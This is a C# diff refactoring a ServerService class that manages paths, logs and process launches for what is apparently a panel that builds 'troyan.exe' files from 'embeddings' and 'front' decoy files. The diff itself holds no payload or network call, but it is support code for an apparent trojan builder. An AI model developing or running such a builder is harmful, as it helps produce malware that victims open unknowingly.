@@ -18,11 +18,15 @@ public partial class ServerService
 
     public ServerService(ServerModelLoader loader) => _loader = loader;
 
+    public ServerModelLoader Loader => _loader;
+
     public IPanelServerPaths Paths => _loader.Paths;
+
+    public ServerLayoutPaths Layout() => new(Paths);
 
     public JsonSerializerOptions Jso => _loader.Jso;
 
-    private void ServerCommons(string serverName, ServerModel serverModel)
+    private void ServerCommons(ServerModel serverModel)
     {
         UpdateTabs(serverModel);
 
@@ -33,52 +37,61 @@ public partial class ServerService
         UpdateDnSponsor(serverModel);
     }
 
-    public string ServerDir(string serverName) => _loader.Paths.ServerDir(serverName);
+    public string ServerDir => Paths.UserDataDir;
 
-    public string EmbeddingsDir(string serverName) => Path.Combine(ServerDir(serverName), "embeddings");
+    public string EmbeddingsDir => Path.Combine(ServerDir, "embeddings");
 
-    public string FrontDir(string serverName) => Path.Combine(ServerDir(serverName), "front");
+    public string FrontDir => Path.Combine(ServerDir, "front");
 
-    public string DataFile(string serverName) => _loader.Paths.DataFile(serverName);
+    public string DataFile => Paths.DataFile;
 
-    public string GetIcon(string serverName) => Path.Combine(ServerDir(serverName), "troyan.ico");
+    public string GetIconPath() => Path.Combine(ServerDir, "troyan.ico");
 
-    public string GetExe(string serverName) => Path.Combine(ServerDir(serverName), "troyan.exe");
+    public string GetExePath() => Path.Combine(ServerDir, "troyan.exe");
 
-    public string GetEmbedding(string serverName, string embeddingName) =>
-        Path.Combine(EmbeddingsDir(serverName), embeddingName);
+    public string GetEmbeddingPath(string embeddingName) => Path.Combine(EmbeddingsDir, embeddingName);
 
-    public void DeleteEmbedding(string serverName, string embeddingName) =>
-        File.Delete(GetEmbedding(serverName, embeddingName));
+    public void DeleteEmbedding(string embeddingName) => File.Delete(GetEmbeddingPath(embeddingName));
 
-    public string GetFront(string serverName, string embeddingName) =>
-        Path.Combine(FrontDir(serverName), embeddingName);
+    public string GetFrontPath(string embeddingName) => Path.Combine(FrontDir, embeddingName);
 
-    public void DeleteFront(string serverName, string embeddingName) =>
-        File.Delete(GetFront(serverName, embeddingName));
+    public void DeleteFront(string embeddingName) => File.Delete(GetFrontPath(embeddingName));
 
-    public ServerModel GetServerLite(string serverName) => _loader.LoadServer(serverName);
+    public string UserPackLogPath => Path.Combine(Paths.UserDataDir, "pack.log");
 
-    public void SaveServerLite(string serverName, ServerModel server) => _loader.SaveServer(serverName, server);
+    public string UserPostLogPath => Path.Combine(Paths.UserDataDir, "post.log");
 
-    public ServerResult GetServerHard(string serverName)
+    public string UserCloneLogPath => Path.Combine(Paths.UserDataDir, "clone.log");
+
+    public ServerModel GetServerLite()
     {
-        var server = GetServerLite(serverName);
+        var server = _loader.Load();
+        server.PanelHomeDirectory = Paths.UserDataDir;
+        return server;
+    }
+
+    public void SaveServerLite(ServerModel server)
+    {
+        server.PanelHomeDirectory = Paths.UserDataDir;
+        _loader.Save(server);
+    }
+
+    public ServerResult GetServerHard()
+    {
+        var server = GetServerLite();
         try
         {
-            ServerCommons(serverName, server);
+            ServerCommons(server);
 
             server.Embeddings = new List<string>();
-            if (Directory.Exists(EmbeddingsDir(serverName)))
-                server.Embeddings = Directory.GetFiles(EmbeddingsDir(serverName)).Select(a => Path.GetFileName(a))
-                    .ToList();
+            if (Directory.Exists(EmbeddingsDir))
+                server.Embeddings = Directory.GetFiles(EmbeddingsDir).Select(a => Path.GetFileName(a)).ToList();
 
             server.Front = new List<string>();
-            if (Directory.Exists(FrontDir(serverName)))
-                server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
-                    .ToList();
+            if (Directory.Exists(FrontDir))
+                server.Front = Directory.GetFiles(FrontDir).Select(a => Path.GetFileName(a)).ToList();
 
-            SaveServerLite(serverName, server);
+            SaveServerLite(server);
 
             return new ServerResult() { ServerModel = server };
         }
@@ -91,30 +104,22 @@ public partial class ServerService
 
     public string Reboot()
     {
-        var result = "";
-        var root = Paths.RootData;
-        if (!Directory.Exists(root))
-            return result;
-        foreach (var dir in Directory.GetDirectories(root))
+        if (!Directory.Exists(Paths.UserDataDir))
+            return "";
+        try
         {
-            try
-            {
-                var server = Path.GetFileName(dir);
-                result += RunScript(server, "reboot", "nolog", null,
-                    new ValueTuple<string, object>("serverName", server));
-            }
-            catch (Exception e)
-            {
-                result += e.Message;
-            }
+            return RunScript(PanelServerIdentity.DefaultKey, "reboot", "nolog", null,
+                new ValueTuple<string, object>("serverName", PanelServerIdentity.DefaultKey));
         }
-
-        return result;
+        catch (Exception e)
+        {
+            return e.Message;
+        }
     }
 
-    public string RunExe(string exe, string serverName, string? arguments = null)
+    public string RunExe(string exe, string? arguments = null)
     {
-        var args = $"{serverName}";
+        var args = PanelServerIdentity.DefaultKey;
         if (!string.IsNullOrEmpty(arguments))
             args += $" {arguments}";
         var sa = new ProcessStartInfo
@@ -154,7 +159,7 @@ public partial class ServerService
             process.StartInfo.RedirectStandardError = true;
             process.StartInfo.UseShellExecute = false;
             process.StartInfo.CreateNoWindow = true;
-            process.StartInfo.WorkingDirectory = ServerDir(server);
+            process.StartInfo.WorkingDirectory = Paths.UserDataDir;
 
             var output = new StringBuilder();
             var error = new StringBuilder();
